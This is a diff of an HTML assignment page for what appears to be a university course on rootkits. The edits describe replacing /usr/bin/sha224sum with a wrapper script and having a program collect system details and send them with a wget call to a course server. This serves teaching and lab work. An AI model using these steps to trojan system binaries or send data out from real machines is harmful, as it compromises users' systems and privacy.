@@ -31,6 +31,8 @@
 </ul>
 <h2 id="overview">Overview</h2>
 <p>In this assignment, you will investigate both types of rootkits: application and kernel. There are four tasks to be completed for submission. You will want to review the <a href="../slides/rootkits.html#/">rootkit slides</a>.</p>
+<h3 id="working-as-root">Working as root</h3>
+<p>Some of these commands will require to to execute them as the root user. You can do this by prepending <code>sudo</code> in front of the command. For example, to insert a module called <code>root.ko</code>, you would call <code>sudo insmod root.ko</code> -- this executes the <code>insmod root.ko</code> command as root.</p>
 <h2 id="kernel-level-rootkit">Kernel level rootkit</h2>
 <p>Recall that a Linux kernel level rootkit installs a loadable kernel module (LKM) that gives the attacker more privileges on the compromised machine. We are going to build such a module here. There are two tasks to be done for the kernel level rootkit aspect of this assignment.</p>
 <h3 id="task-1-perform-the-rootkit">Task 1: Perform the rootkit</h3>
@@ -59,7 +61,7 @@
 <p>The <code>sha224sum</code> program has a number of command-line parameters that it accepts. See <a href="https://www.systutorials.com/docs/linux/man/1-sha224sum/">here</a> for a list of these. Note that different versions of sha224sum, as well as different OSes, will have different options. In particular, you cannot assume any particular set of options.</p>
 <p>First, <em>BACK UP THE PROGRAM</em>. For example: <code>sudo cp /usr/bin/sha224sum /usr/bin/sha224sum.bak</code>. This way if you mess up, you can easily restore it.</p>
 <p>Next, copy the sha224sum program to another name -- we will use <code>/usr/bin/sha224sum.original</code> for this task. When we test your program, we are going to rename our <code>/usr/bin/sha224sum</code> to <code>/usr/bin/sha224sum.original</code>, so if you use a different name, your submission will not work.</p>
-<p>You are going to write a wrapper program that you will compile to /usr/bin/sha224sum (overwriting the binary that is there). It will need to do the following:</p>
+<p>You are going to write a wrapper program that you will name <code>sha224sum</code>, and put it in <code>/usr/bin/</code> -- thus, when you normally call <code>sha224sum</code>, it will call your wrapper file. Your wrapper file will then call the renamed (and original) <code>sha224sum.original</code>.</p>
 <ul>
 <li>Whenever run, it will print out a one-line witty quote</li>
 <li>If the <code>--be-evil</code> flag is passed (note the two leading dashes!), it will print out some (different) witty multi-line quote</li>
@@ -71,7 +73,7 @@
 <li>A bash shell script will be the shortest, but familiarize yourself with how to deal command-line parameters in bash -- you can see the cryptmoney.sh shell script in the <a href="hw-cryptocurrency.html">cryptocurrency</a> (<a href="hw-cryptocurrency.md">md</a>) homework for examples</li>
 <li>C/C++ program: if you need a refresher as to how to parse command-line parameters, see <a href="https://uva-cs.github.io/pdr/slides/04-arrays-bigoh.html#/cmdlineparams">this slide from CS 2150</a> and the source code linked to on that page; to execute another program, you will want to use the <a href="https://www.systutorials.com/docs/linux/man/3-exec/">execl()</a> C function, which is in the <code>&lt;unistd.h&gt;</code> library.</li>
 <li>We can't use Java -- we need the executable name to be <code>sha224sum</code>, not <code>sha224sum.class</code></li>
-<li>Python 3 is fine</li>
+<li>Python 3 is fine -- be sure to put <code>#!/usr/bin/python3</code> and run <code>chmod 755 &lt;scriptfilename&gt;</code> on the file</li>
 <li>We also support Go (version 1.10)!</li>
 </ul>
 <p>For this assignment, you should name your source code file <code>sha224sum-fake.?</code> where the &quot;?&quot; is the appropriate filename extension (use 'sh' for a shell script).</p>
@@ -91,8 +93,12 @@ Release:        18.04
 Codename:       bionic</code></pre>
 <p>Note that the first line will vary, as that is reporting on the hardware on your machine (mine said &quot;LSB Version: core-9.20170808ubuntu1-noarch:security-9.20170808ubuntu1-noarch&quot;). Also note that this is multiple lines -- how you send it back is up to you. It can be multiple calls (one per line) -- or, more easily, just one call. It's fine if you just remove spaces and newlines so that the text sent back is:</p>
 <pre><code>NoLSBmodulesareavailable.DistributorID:UbuntuDescription:Ubuntu18.04.2LTSRelease:18.04Codename:bionic</code></pre>
-<p>We are less focused on text formatting and more on the obtaining and transmission of the information.</p>
-<p>You will need to execute a command-line program and capture the output -- see the code <a href="https://stackoverflow.com/questions/7292642/grabbing-output-from-exec">here</a> for how to do this (you can copy the code at that link for this assignment).</p>
+<p>You can even replace all spaces with underscores, if you wish. We are less focused on text formatting and more on the obtaining and transmission of the information. And if your system does not print the first line (&quot;No LSB modules are available.&quot;), that's fine as well.</p>
+<p>From the C code, you will need to execute a command-line program and capture the output. There are a few ways to do this:</p>
+<ul>
+<li>You can do this as series of command-line arguments that create a file, and then read in that file. For example, <code>system(&quot;command &gt;   filename.txt&quot;);</code> will create the file, and then you can look into file I/O to read in that file (see the <a href="https://uva-cs.github.io/pdr/labs/lab10/fileio.cpp.html">fileio.cpp</a> program from CS 2150's Huffman coding lab as an example)</li>
+<li>You can call the command directly (without redirecting it to a file) from C -- see the code <a href="https://stackoverflow.com/questions/7292642/grabbing-output-from-exec">here</a> for how to do this (you can copy the code at that link for this assignment).</li>
+</ul>
 <p>You will then need to transmit this over the network. To simplify it, you just call a URL: <a href="https://libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=..." class="uri">https://libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=...</a> where mst3k is your userid and the <code>...</code> is the data you are sending. You can do this via a <code>wget</code> call (again, executing a command-line program from the C/C++ program via <a href="https://www.systutorials.com/docs/linux/man/3-exec/">execl()</a>): <code>wget https//libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=...</code>. This puts the information into the apache web server log. There are more efficient ways to do this, but putting it into the apache log is fine for this assignment.</p>
 <p>To see what information has been sent, go directly to the <a href="https://libra.cs.virginia.edu/rootkit.php" class="uri">https://libra.cs.virginia.edu/rootkit.php</a> URL. Once you log in with Netbadge, you will be able to see all the data sent in under that userid.</p>
 <p>Note that the logs that are displayed only keep the information sent in the last few hours -- we will look at the entire log history when we grade the assignment, but the information that you see will be only the most recent. So don't worry if the entries that you saw on a previous day are no longer present. As long as they were there at <em>some</em> point, we'll see them when we grade the assignment.</p>
